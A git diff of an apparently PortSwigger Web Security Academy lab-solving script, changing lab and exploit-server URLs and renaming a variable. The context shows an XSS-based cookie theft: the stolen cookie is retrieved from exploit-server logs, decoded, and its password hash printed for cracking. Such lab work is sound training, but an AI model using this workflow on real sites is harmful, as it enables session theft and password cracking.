@@ -87,10 +87,10 @@ def extract_cookie_from_logs(exploit_server_url):
 ###########
 
 # change this to your lab URL
-lab_url = "https://0acb00d103d36d7580f2a39000990080.web-security-academy.net"
+lab_url = "https://0a65002d04b3bcf283f910fa001b0060.web-security-academy.net"
 
 # change this to your exploit server URL
-exploit_server_url = "https://exploit-0a0a0081035a6d118001a22d01170006.exploit-server.net"
+exploit_server_url = "https://exploit-0a5a001a048bbc3883090f7601bd0005.exploit-server.net"
 
 
 # try to inject the XSS payload
@@ -107,10 +107,10 @@ if is_exploited:
         print(Fore.WHITE + "3. Decoding the encrypted cookie.. OK")
         
         # decode the cookie to get the hash
-        decrypt = base64.b64decode(cookie).decode() 
+        decoded = base64.b64decode(cookie).decode() 
         
         # split the decoded string to obtain the hash only without the username
-        hash = decrypt.split(":")[1] 
+        hash = decoded.split(":")[1] 
 
         print(Fore.YELLOW + "✅ Password hash: " + Fore.GREEN + hash)
         print(Fore.WHITE + "Crack this hash using any online hash cracker")
